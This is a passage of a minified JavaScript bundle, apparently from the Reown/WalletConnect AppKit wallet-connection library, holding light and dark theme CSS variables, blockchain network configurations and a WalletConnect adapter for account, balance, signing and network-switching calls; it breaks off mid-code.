          --wui-color-fg-325: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-325)
          );
          --wui-color-fg-350: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-350)
          );

          --wui-color-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-100)
          );
          --wui-color-bg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-125)
          );
          --wui-color-bg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-150)
          );
          --wui-color-bg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-175)
          );
          --wui-color-bg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-200)
          );
          --wui-color-bg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-225)
          );
          --wui-color-bg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-250)
          );
          --wui-color-bg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-275)
          );
          --wui-color-bg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-300)
          );
          --wui-color-bg-325: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-325)
          );
          --wui-color-bg-350: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-350)
          );

          --wui-color-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-100)
          );
          --wui-color-success-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-125)
          );

          --wui-color-warning-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-warning-base-100)
          );

          --wui-color-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-100)
          );
          --wui-color-blue-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-blue-base-100)
          );
          --wui-color-blue-90: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-blue-base-90)
          );
          --wui-color-error-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-125)
          );

          --wui-icon-box-bg-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-error-base-100)
          );
          --wui-icon-box-bg-accent-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-blue-base-100)
          );
          --wui-icon-box-bg-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-success-base-100)
          );
          --wui-icon-box-bg-inverse-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-inverse-base-100)
          );

          --wui-all-wallets-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-all-wallets-bg-100)
          );

          --wui-avatar-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-avatar-border-base)
          );

          --wui-thumbnail-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-thumbnail-border-base)
          );

          --wui-wallet-button-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-wallet-button-bg-base)
          );
        }
      }
    `,light:ac`
      :root {
        --w3m-color-mix: ${Fn((t==null?void 0:t["--w3m-color-mix"])||"#fff")};
        --w3m-accent: ${Fn(hs(t,"dark")["--w3m-accent"])};
        --w3m-default: #fff;

        --wui-color-modal-bg-base: ${Fn(hs(t,"dark")["--w3m-background"])};
        --wui-color-accent-base-100: var(--w3m-accent);

        --wui-color-blueberry-100: hsla(230, 100%, 67%, 1);
        --wui-color-blueberry-090: hsla(231, 76%, 61%, 1);
        --wui-color-blueberry-080: hsla(230, 59%, 55%, 1);
        --wui-color-blueberry-050: hsla(231, 100%, 70%, 0.1);

        --wui-color-fg-100: #e4e7e7;
        --wui-color-fg-125: #d0d5d5;
        --wui-color-fg-150: #a8b1b1;
        --wui-color-fg-175: #a8b0b0;
        --wui-color-fg-200: #949e9e;
        --wui-color-fg-225: #868f8f;
        --wui-color-fg-250: #788080;
        --wui-color-fg-275: #788181;
        --wui-color-fg-300: #6e7777;
        --wui-color-fg-325: #9a9a9a;
        --wui-color-fg-350: #363636;

        --wui-color-bg-100: #141414;
        --wui-color-bg-125: #191a1a;
        --wui-color-bg-150: #1e1f1f;
        --wui-color-bg-175: #222525;
        --wui-color-bg-200: #272a2a;
        --wui-color-bg-225: #2c3030;
        --wui-color-bg-250: #313535;
        --wui-color-bg-275: #363b3b;
        --wui-color-bg-300: #3b4040;
        --wui-color-bg-325: #252525;
        --wui-color-bg-350: #ffffff;

        --wui-color-success-base-100: #26d962;
        --wui-color-success-base-125: #30a46b;

        --wui-color-warning-base-100: #f3a13f;

        --wui-color-error-base-100: #f25a67;
        --wui-color-error-base-125: #df4a34;

        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);

        --wui-color-success-glass-001: rgba(38, 217, 98, 0.01);
        --wui-color-success-glass-002: rgba(38, 217, 98, 0.02);
        --wui-color-success-glass-005: rgba(38, 217, 98, 0.05);
        --wui-color-success-glass-010: rgba(38, 217, 98, 0.1);
        --wui-color-success-glass-015: rgba(38, 217, 98, 0.15);
        --wui-color-success-glass-020: rgba(38, 217, 98, 0.2);
        --wui-color-success-glass-025: rgba(38, 217, 98, 0.25);
        --wui-color-success-glass-030: rgba(38, 217, 98, 0.3);
        --wui-color-success-glass-060: rgba(38, 217, 98, 0.6);
        --wui-color-success-glass-080: rgba(38, 217, 98, 0.8);

        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);

        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);

        --wui-color-error-glass-001: rgba(242, 90, 103, 0.01);
        --wui-color-error-glass-002: rgba(242, 90, 103, 0.02);
        --wui-color-error-glass-005: rgba(242, 90, 103, 0.05);
        --wui-color-error-glass-010: rgba(242, 90, 103, 0.1);
        --wui-color-error-glass-015: rgba(242, 90, 103, 0.15);
        --wui-color-error-glass-020: rgba(242, 90, 103, 0.2);
        --wui-color-error-glass-025: rgba(242, 90, 103, 0.25);
        --wui-color-error-glass-030: rgba(242, 90, 103, 0.3);
        --wui-color-error-glass-060: rgba(242, 90, 103, 0.6);
        --wui-color-error-glass-080: rgba(242, 90, 103, 0.8);

        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);

        --wui-color-gray-glass-001: rgba(255, 255, 255, 0.01);
        --wui-color-gray-glass-002: rgba(255, 255, 255, 0.02);
        --wui-color-gray-glass-005: rgba(255, 255, 255, 0.05);
        --wui-color-gray-glass-010: rgba(255, 255, 255, 0.1);
        --wui-color-gray-glass-015: rgba(255, 255, 255, 0.15);
        --wui-color-gray-glass-020: rgba(255, 255, 255, 0.2);
        --wui-color-gray-glass-025: rgba(255, 255, 255, 0.25);
        --wui-color-gray-glass-030: rgba(255, 255, 255, 0.3);
        --wui-color-gray-glass-060: rgba(255, 255, 255, 0.6);
        --wui-color-gray-glass-080: rgba(255, 255, 255, 0.8);
        --wui-color-gray-glass-090: rgba(255, 255, 255, 0.9);

        --wui-color-dark-glass-100: rgba(42, 42, 42, 1);

        --wui-icon-box-bg-error-base-100: #3c2426;
        --wui-icon-box-bg-blue-base-100: #20303f;
        --wui-icon-box-bg-success-base-100: #1f3a28;
        --wui-icon-box-bg-inverse-base-100: #243240;

        --wui-all-wallets-bg-100: #222b35;

        --wui-avatar-border-base: #252525;

        --wui-thumbnail-border-base: #252525;

        --wui-wallet-button-bg-base: var(--wui-color-bg-125);

        --w3m-card-embedded-shadow-color: rgb(17 17 18 / 25%);
      }
    `,dark:ac`
      :root {
        --w3m-color-mix: ${Fn((t==null?void 0:t["--w3m-color-mix"])||"#000")};
        --w3m-accent: ${Fn(hs(t,"light")["--w3m-accent"])};
        --w3m-default: #000;

        --wui-color-modal-bg-base: ${Fn(hs(t,"light")["--w3m-background"])};
        --wui-color-accent-base-100: var(--w3m-accent);

        --wui-color-blueberry-100: hsla(231, 100%, 70%, 1);
        --wui-color-blueberry-090: hsla(231, 97%, 72%, 1);
        --wui-color-blueberry-080: hsla(231, 92%, 74%, 1);

        --wui-color-fg-100: #141414;
        --wui-color-fg-125: #2d3131;
        --wui-color-fg-150: #474d4d;
        --wui-color-fg-175: #636d6d;
        --wui-color-fg-200: #798686;
        --wui-color-fg-225: #828f8f;
        --wui-color-fg-250: #8b9797;
        --wui-color-fg-275: #95a0a0;
        --wui-color-fg-300: #9ea9a9;
        --wui-color-fg-325: #9a9a9a;
        --wui-color-fg-350: #d0d0d0;

        --wui-color-bg-100: #ffffff;
        --wui-color-bg-125: #f5fafa;
        --wui-color-bg-150: #f3f8f8;
        --wui-color-bg-175: #eef4f4;
        --wui-color-bg-200: #eaf1f1;
        --wui-color-bg-225: #e5eded;
        --wui-color-bg-250: #e1e9e9;
        --wui-color-bg-275: #dce7e7;
        --wui-color-bg-300: #d8e3e3;
        --wui-color-bg-325: #f3f3f3;
        --wui-color-bg-350: #202020;

        --wui-color-success-base-100: #26b562;
        --wui-color-success-base-125: #30a46b;

        --wui-color-warning-base-100: #f3a13f;

        --wui-color-error-base-100: #f05142;
        --wui-color-error-base-125: #df4a34;

        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);

        --wui-color-success-glass-001: rgba(38, 181, 98, 0.01);
        --wui-color-success-glass-002: rgba(38, 181, 98, 0.02);
        --wui-color-success-glass-005: rgba(38, 181, 98, 0.05);
        --wui-color-success-glass-010: rgba(38, 181, 98, 0.1);
        --wui-color-success-glass-015: rgba(38, 181, 98, 0.15);
        --wui-color-success-glass-020: rgba(38, 181, 98, 0.2);
        --wui-color-success-glass-025: rgba(38, 181, 98, 0.25);
        --wui-color-success-glass-030: rgba(38, 181, 98, 0.3);
        --wui-color-success-glass-060: rgba(38, 181, 98, 0.6);
        --wui-color-success-glass-080: rgba(38, 181, 98, 0.8);

        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);

        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);

        --wui-color-error-glass-001: rgba(240, 81, 66, 0.01);
        --wui-color-error-glass-002: rgba(240, 81, 66, 0.02);
        --wui-color-error-glass-005: rgba(240, 81, 66, 0.05);
        --wui-color-error-glass-010: rgba(240, 81, 66, 0.1);
        --wui-color-error-glass-015: rgba(240, 81, 66, 0.15);
        --wui-color-error-glass-020: rgba(240, 81, 66, 0.2);
        --wui-color-error-glass-025: rgba(240, 81, 66, 0.25);
        --wui-color-error-glass-030: rgba(240, 81, 66, 0.3);
        --wui-color-error-glass-060: rgba(240, 81, 66, 0.6);
        --wui-color-error-glass-080: rgba(240, 81, 66, 0.8);

        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);

        --wui-icon-box-bg-error-base-100: #f4dfdd;
        --wui-icon-box-bg-blue-base-100: #d9ecfb;
        --wui-icon-box-bg-success-base-100: #daf0e4;
        --wui-icon-box-bg-inverse-base-100: #dcecfc;

        --wui-all-wallets-bg-100: #e8f1fa;

        --wui-avatar-border-base: #f3f4f4;

        --wui-thumbnail-border-base: #eaefef;

        --wui-wallet-button-bg-base: var(--wui-color-bg-125);

        --wui-color-gray-glass-001: rgba(0, 0, 0, 0.01);
        --wui-color-gray-glass-002: rgba(0, 0, 0, 0.02);
        --wui-color-gray-glass-005: rgba(0, 0, 0, 0.05);
        --wui-color-gray-glass-010: rgba(0, 0, 0, 0.1);
        --wui-color-gray-glass-015: rgba(0, 0, 0, 0.15);
        --wui-color-gray-glass-020: rgba(0, 0, 0, 0.2);
        --wui-color-gray-glass-025: rgba(0, 0, 0, 0.25);
        --wui-color-gray-glass-030: rgba(0, 0, 0, 0.3);
        --wui-color-gray-glass-060: rgba(0, 0, 0, 0.6);
        --wui-color-gray-glass-080: rgba(0, 0, 0, 0.8);
        --wui-color-gray-glass-090: rgba(0, 0, 0, 0.9);

        --wui-color-dark-glass-100: rgba(233, 233, 233, 1);

        --w3m-card-embedded-shadow-color: rgb(224 225 233 / 25%);
      }
    `}}const yJ=ac`
  *,
  *::after,
  *::before,
  :host {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-style: normal;
    text-rendering: optimizeSpeed;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    -webkit-tap-highlight-color: transparent;
    font-family: var(--wui-font-family);
    backface-visibility: hidden;
  }
`,wJ=ac`
  button,
  a {
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    transition:
      color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      box-shadow var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: background-color, color, border, box-shadow, border-radius;
    outline: none;
    border: none;
    column-gap: var(--wui-spacing-3xs);
    background-color: transparent;
    text-decoration: none;
  }

  wui-flex {
    transition: border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius;
  }

  button:disabled > wui-wallet-image,
  button:disabled > wui-all-wallets-image,
  button:disabled > wui-network-image,
  button:disabled > wui-image,
  button:disabled > wui-transaction-visual,
  button:disabled > wui-logo {
    filter: grayscale(1);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-gray-glass-005);
    }

    button:active:enabled {
      background-color: var(--wui-color-gray-glass-010);
    }
  }

  button:disabled > wui-icon-box {
    opacity: 0.5;
  }

  input {
    border: none;
    outline: none;
    appearance: none;
  }
`,bJ=ac`
  .wui-color-inherit {
    color: var(--wui-color-inherit);
  }

  .wui-color-accent-100 {
    color: var(--wui-color-accent-100);
  }

  .wui-color-error-100 {
    color: var(--wui-color-error-100);
  }

  .wui-color-blue-100 {
    color: var(--wui-color-blue-100);
  }

  .wui-color-blue-90 {
    color: var(--wui-color-blue-90);
  }

  .wui-color-error-125 {
    color: var(--wui-color-error-125);
  }

  .wui-color-success-100 {
    color: var(--wui-color-success-100);
  }

  .wui-color-success-125 {
    color: var(--wui-color-success-125);
  }

  .wui-color-inverse-100 {
    color: var(--wui-color-inverse-100);
  }

  .wui-color-inverse-000 {
    color: var(--wui-color-inverse-000);
  }

  .wui-color-fg-100 {
    color: var(--wui-color-fg-100);
  }

  .wui-color-fg-200 {
    color: var(--wui-color-fg-200);
  }

  .wui-color-fg-300 {
    color: var(--wui-color-fg-300);
  }

  .wui-color-fg-325 {
    color: var(--wui-color-fg-325);
  }

  .wui-color-fg-350 {
    color: var(--wui-color-fg-350);
  }

  .wui-bg-color-inherit {
    background-color: var(--wui-color-inherit);
  }

  .wui-bg-color-blue-100 {
    background-color: var(--wui-color-accent-100);
  }

  .wui-bg-color-error-100 {
    background-color: var(--wui-color-error-100);
  }

  .wui-bg-color-error-125 {
    background-color: var(--wui-color-error-125);
  }

  .wui-bg-color-success-100 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-success-125 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-inverse-100 {
    background-color: var(--wui-color-inverse-100);
  }

  .wui-bg-color-inverse-000 {
    background-color: var(--wui-color-inverse-000);
  }

  .wui-bg-color-fg-100 {
    background-color: var(--wui-color-fg-100);
  }

  .wui-bg-color-fg-200 {
    background-color: var(--wui-color-fg-200);
  }

  .wui-bg-color-fg-300 {
    background-color: var(--wui-color-fg-300);
  }

  .wui-color-fg-325 {
    background-color: var(--wui-color-fg-325);
  }

  .wui-color-fg-350 {
    background-color: var(--wui-color-fg-350);
  }
`,Vh={ERROR_CODE_UNRECOGNIZED_CHAIN_ID:4902,ERROR_CODE_DEFAULT:5e3,ERROR_INVALID_CHAIN_ID:32603},oW=Uy({id:42161,name:"Arbitrum One",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://arb1.arbitrum.io/rpc"]}},blockExplorers:{default:{name:"Arbiscan",url:"https://arbiscan.io",apiUrl:"https://api.arbiscan.io/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:7654707}}}),aW=Uy({id:56,name:"BNB Smart Chain",nativeCurrency:{decimals:18,name:"BNB",symbol:"BNB"},rpcUrls:{default:{http:["https://56.rpc.thirdweb.com"]}},blockExplorers:{default:{name:"BscScan",url:"https://bscscan.com",apiUrl:"https://api.bscscan.com/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:15921452}}}),cW=Uy({id:1,name:"Ethereum",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://eth.merkle.io"]}},blockExplorers:{default:{name:"Etherscan",url:"https://etherscan.io",apiUrl:"https://api.etherscan.io/api"}},contracts:{ensRegistry:{address:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e"},ensUniversalResolver:{address:"0xce01f8eee7E479C928F8919abD53E553a36CeF67",blockCreated:19258213},multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:14353601}}});function gh(t){return{formatters:void 0,fees:void 0,serializers:void 0,...t}}const tA=gh({id:"5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",name:"Solana",network:"solana-mainnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!1,chainNamespace:"solana",caipNetworkId:"solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",deprecatedCaipNetworkId:"solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ"}),rA=gh({id:"EtWTRABZaYq6iMfeYKouRu166VU2xqa1",name:"Solana Devnet",network:"solana-devnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1",deprecatedCaipNetworkId:"solana:8E9rvCKLFQia2Y35HXjjpWzj8weVo44K"});gh({id:"4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z",name:"Solana Testnet",network:"solana-testnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z"});gh({id:"000000000019d6689c085ae165831e93",caipNetworkId:"bip122:000000000019d6689c085ae165831e93",chainNamespace:"bip122",name:"Bitcoin",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}}});gh({id:"000000000933ea01ad0ee984209779ba",caipNetworkId:"bip122:000000000933ea01ad0ee984209779ba",chainNamespace:"bip122",name:"Bitcoin Testnet",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},testnet:!0});const uW={solana:["solana_signMessage","solana_signTransaction","solana_requestAccounts","solana_getAccounts","solana_signAllTransactions","solana_signAndSendTransaction"],eip155:["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_showCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"],bip122:["sendTransfer","signMessage","signPsbt","getAccountAddresses"]},Yf={getMethodsByChainNamespace(t){return uW[t]||[]},createDefaultNamespace(t){return{methods:this.getMethodsByChainNamespace(t),events:["accountsChanged","chainChanged"],chains:[],rpcMap:{}}},applyNamespaceOverrides(t,e){if(!e)return{...t};const r={...t},n=new Set;if(e.methods&&Object.keys(e.methods).forEach(i=>n.add(i)),e.chains&&Object.keys(e.chains).forEach(i=>n.add(i)),e.events&&Object.keys(e.events).forEach(i=>n.add(i)),e.rpcMap&&Object.keys(e.rpcMap).forEach(i=>{const[s]=i.split(":");s&&n.add(s)}),n.forEach(i=>{r[i]||(r[i]=this.createDefaultNamespace(i))}),e.methods&&Object.entries(e.methods).forEach(([i,s])=>{r[i]&&(r[i].methods=s)}),e.chains&&Object.entries(e.chains).forEach(([i,s])=>{r[i]&&(r[i].chains=s)}),e.events&&Object.entries(e.events).forEach(([i,s])=>{r[i]&&(r[i].events=s)}),e.rpcMap){const i=new Set;Object.entries(e.rpcMap).forEach(([s,o])=>{const[a,c]=s.split(":");!a||!c||!r[a]||(r[a].rpcMap||(r[a].rpcMap={}),i.has(a)||(r[a].rpcMap={},i.add(a)),r[a].rpcMap[c]=o)})}return r},createNamespaces(t,e){const r=t.reduce((n,i)=>{const{id:s,chainNamespace:o,rpcUrls:a}=i,c=a.default.http[0];n[o]||(n[o]=this.createDefaultNamespace(o));const u=`${o}:${s}`,l=n[o];switch(l.chains.push(u),u){case tA.caipNetworkId:l.chains.push(tA.deprecatedCaipNetworkId);break;case rA.caipNetworkId:l.chains.push(rA.deprecatedCaipNetworkId);break}return l!=null&&l.rpcMap&&c&&(l.rpcMap[s]=c),n},{});return this.applyNamespaceOverrides(r,e)},resolveReownName:async t=>{var n;const e=await C2.resolveName(t);return((n=(Object.values(e==null?void 0:e.addresses)||[])[0])==null?void 0:n.address)||!1},getChainsFromNamespaces(t={}){return Object.values(t).flatMap(e=>{const r=e.chains||[],n=e.accounts.map(i=>{const[s,o]=i.split(":");return`${s}:${o}`});return Array.from(new Set([...r,...n]))})},isSessionEventData(t){return typeof t=="object"&&t!==null&&"id"in t&&"topic"in t&&"params"in t&&typeof t.params=="object"&&t.params!==null&&"chainId"in t.params&&"event"in t.params&&typeof t.params.event=="object"&&t.params.event!==null}};class jy{constructor({provider:e,namespace:r}){this.id=Z.CONNECTOR_ID.WALLET_CONNECT,this.name=Qs.ConnectorNamesMap[Z.CONNECTOR_ID.WALLET_CONNECT],this.type="WALLET_CONNECT",this.imageId=Qs.ConnectorImageIds[Z.CONNECTOR_ID.WALLET_CONNECT],this.getCaipNetworks=q.getCaipNetworks.bind(q),this.caipNetworks=this.getCaipNetworks(),this.provider=e,this.chain=r}get chains(){return this.getCaipNetworks()}async connectWalletConnect(){if(!await this.authenticate()){const r=this.getCaipNetworks(),n=te.state.universalProviderConfigOverride,i=Yf.createNamespaces(r,n);await this.provider.connect({optionalNamespaces:i})}return{clientId:await this.provider.client.core.crypto.getClientId(),session:this.provider.session}}async disconnect(){await this.provider.disconnect()}async authenticate(){const e=this.chains.map(r=>r.caipNetworkId);return Ru.universalProviderAuthenticate({universalProvider:this.provider,chains:e,methods:lW})}}const lW=["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"];class j2{constructor(e){this.availableConnectors=[],this.eventListeners=new Map,this.getCaipNetworks=r=>q.getCaipNetworks(r),e&&this.construct(e)}construct(e){this.projectId=e.projectId,this.namespace=e.namespace,this.adapterType=e.adapterType}get connectors(){return this.availableConnectors}get networks(){return this.getCaipNetworks(this.namespace)}setAuthProvider(e){this.addConnector({id:Z.CONNECTOR_ID.AUTH,type:"AUTH",name:Z.CONNECTOR_NAMES.AUTH,provider:e,imageId:Qs.ConnectorImageIds[Z.CONNECTOR_ID.AUTH],chain:this.namespace,chains:[]})}addConnector(...e){const r=new Set;this.availableConnectors=[...e,...this.availableConnectors].filter(n=>r.has(n.id)?!1:(r.add(n.id),!0)),this.emit("connectors",this.availableConnectors)}setStatus(e,r){pe.setStatus(e,r)}on(e,r){var n;this.eventListeners.has(e)||this.eventListeners.set(e,new Set),(n=this.eventListeners.get(e))==null||n.add(r)}off(e,r){const n=this.eventListeners.get(e);n&&n.delete(r)}removeAllEventListeners(){this.eventListeners.forEach(e=>{e.clear()})}emit(e,r){const n=this.eventListeners.get(e);n&&n.forEach(i=>i(r))}async connectWalletConnect(e){return{clientId:(await this.getWalletConnectConnector().connectWalletConnect()).clientId}}async switchNetwork(e){var s;const{caipNetwork:r,providerType:n}=e;if(!e.provider)return;const i="provider"in e.provider?e.provider.provider:e.provider;if(n==="WALLET_CONNECT"){i.setDefaultChain(r.caipNetworkId);return}if(i&&n==="AUTH"){const o=i,a=(s=pe.state.preferredAccountTypes)==null?void 0:s[r.chainNamespace];await o.switchNetwork(r.caipNetworkId);const c=await o.getUser({chainId:r.caipNetworkId,preferredAccountType:a});this.emit("switchNetwork",c)}}getWalletConnectConnector(){const e=this.connectors.find(r=>r instanceof jy);if(!e)throw new Error("WalletConnectConnector not found");return e}}class hW extends j2{setUniversalProvider(e){this.addConnector(new jy({provider:e,caipNetworks:this.getCaipNetworks(),namespace:this.namespace}))}async connect(e){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:Number(e.chainId),provider:this.provider,address:""})}async disconnect(){try{await this.getWalletConnectConnector().disconnect()}catch(e){console.warn("UniversalAdapter:disconnect - error",e)}}async getAccounts({namespace:e}){var i,s,o,a;const r=this.provider,n=((a=(o=(s=(i=r==null?void 0:r.session)==null?void 0:i.namespaces)==null?void 0:s[e])==null?void 0:o.accounts)==null?void 0:a.map(c=>{const[,,u]=c.split(":");return u}).filter((c,u,l)=>l.indexOf(c)===u))||[];return Promise.resolve({accounts:n.map(c=>Ie.createAccount(e,c,e==="bip122"?"payment":"eoa"))})}async syncConnectors(){return Promise.resolve()}async getBalance(e){var s,o,a,c,u;if(!(e.caipNetwork&&Ar.BALANCE_SUPPORTED_CHAINS.includes((s=e.caipNetwork)==null?void 0:s.chainNamespace))||(o=e.caipNetwork)!=null&&o.testnet)return{balance:"0.00",symbol:((a=e.caipNetwork)==null?void 0:a.nativeCurrency.symbol)||""};if(pe.state.balanceLoading&&e.chainId===((c=q.state.activeCaipNetwork)==null?void 0:c.id))return{balance:pe.state.balance||"0.00",symbol:pe.state.balanceSymbol||""};const i=(await pe.fetchTokenBalance()).find(l=>{var h,d;return l.chainId===`${(h=e.caipNetwork)==null?void 0:h.chainNamespace}:${e.chainId}`&&l.symbol===((d=e.caipNetwork)==null?void 0:d.nativeCurrency.symbol)});return{balance:(i==null?void 0:i.quantity.numeric)||"0.00",symbol:(i==null?void 0:i.symbol)||((u=e.caipNetwork)==null?void 0:u.nativeCurrency.symbol)||""}}async signMessage(e){var o,a,c;const{provider:r,message:n,address:i}=e;if(!r)throw new Error("UniversalAdapter:signMessage - provider is undefined");let s="";return((o=q.state.activeCaipNetwork)==null?void 0:o.chainNamespace)===Z.CHAIN.SOLANA?s=(await r.request({method:"solana_signMessage",params:{message:$_.encode(new TextEncoder().encode(n)),pubkey:i}},(a=q.state.activeCaipNetwork)==null?void 0:a.caipNetworkId)).signature:s=await r.request({method:"personal_sign",params:[n,i]},(c=q.state.activeCaipNetwork)==null?void 0:c.caipNetworkId),{signature:s}}async estimateGas(){return Promise.resolve({gas:BigInt(0)})}async getProfile(){return Promise.resolve({profileImage:"",profileName:""})}async sendTransaction(){return Promise.resolve({hash:""})}walletGetAssets(e){return Promise.resolve({})}async writeContract(){return Promise.resolve({hash:""})}async getEnsAddress(){return Promise.resolve({address:!1})}parseUnits(){return 0n}formatUnits(){return"0"}async getCapabilities(){return Promise.resolve({})}async grantPermissions(){return Promise.resolve({})}async revokePermissions(){return Promise.resolve("0x")}async syncConnection(){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:1,provider:this.provider,address:""})}async switchNetwork(e){var i,s,o,a,c,u;const{caipNetwork:r}=e,n=this.getWalletConnectConnector();if(r.chainNamespace===Z.CHAIN.EVM)try{await((i=n.provider)==null?void 